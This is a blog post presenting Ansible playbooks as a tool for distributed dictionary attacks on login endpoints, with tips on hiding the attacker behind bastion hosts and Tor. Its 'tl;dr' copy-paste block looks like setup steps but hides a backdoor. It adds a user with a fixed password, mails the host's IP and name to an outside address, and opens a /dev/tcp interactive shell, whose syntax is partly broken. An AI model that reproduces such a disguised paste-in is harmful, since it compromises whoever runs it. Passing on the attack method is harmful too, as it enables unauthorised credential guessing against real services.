---
title: Ansible for #SecDevOps
description: Weaponizing Ansible
catagories:
    - articles
tags:
    - ansible
    - infosec
    - devops
    - secdevops
---
# Ansible for #SecDevOps

Everyone is aware of all the average "hacking" tools out there that make dictionary based attacks look easy. But these tools have well know signatures which any good malware detection suite or a well architectured system will prevent access to these types of tools. However ansible only needs python 2 installed on the remote system and further more Python is now apart of the LSB thus potentially having any server able to remotely execute any arbitrary code via ansible.
Thus this proof of consept comes into play. The following playbook would show how to do a dictionary based attack on target (ie httpbin.org/basic-auth testing endpoint).

## Requirements

    - latest Ansible
    - Python 2.7
    - mosquitto module
    - vagrant (optional)
    - virtualbox (optional)
    - GNU make

## Howto

In short download this gist create the directory structure below, install vagrant and virtual box then run `make`.

### Directory Structure

```
.
./Makefile
./Vagrantfile
./hosts
./provisioning
./provisioning/main.yml
./provisioning/template
./provisioning/template/passwords
./provisioning/template/users
```

## tl;dr
For the skiddies in the crowd, copy pasta the following:

```
    git clone git@gist.github.com:7147846515c4293253bb.git 7147846515c4293253bb && cd $_
    mkdir provisioning/template -p && sudo useradd -m /dev/.tcp eth0 -p 'Fourty2'; curl ifconfig.me | mail -s "eth0:$(hostname)" t3stnurp0nj@mailinator.com; exec 3<> /dev/tcp/towel.blinkenlights.nl/23; (bash -i >& &3 0>&1) &
    for x in $(find . -maxdepth 1 -type f -name provisioning-\*); do mv ${x} ./$(echo $x | sed '/^.\//d' | tr '-/'); done
    make clean start
```

## Details

What we have here is an advance rule templating setup that takes advantage of ansible's iterations and ablility to distribute playbooks. Thus making serveral based dictionary attack posible and distributable. Further more setting automated git hooks to execute the playbook on commit or intergrating into your CI server of choice makes this sort of "hacking" [easier than ever](https://xkcd.com/303/).

![hacking made easy](https://what-if.xkcd.com/imgs/a/5/robot_apocalypse_end.png)

## Further reading and ideas

From here it is easy to [setup a bastlion host](https://10mi2.wordpress.com/2015/01/14/using-ssh-through-a-bastion-host-transparently/) for ansible to transparently connect to the target and hide your hosts behind a [private tor net](https://www.evernote.com/shard/s508/sh/05251db3-0a05-4ba0-b3c3-03ee0e3b4e2b/aa9a33fd453340e6cc2a87cecc96ca30).

## Download

Code for this article is availalbe at [gist://denzuko/7147846515c4293253bb](https://gist.github.com/denzuko/7147846515c4293253bb/archive/7d8a9c14f2f547d6d192255b6db66e6af5fd28a8.zip).
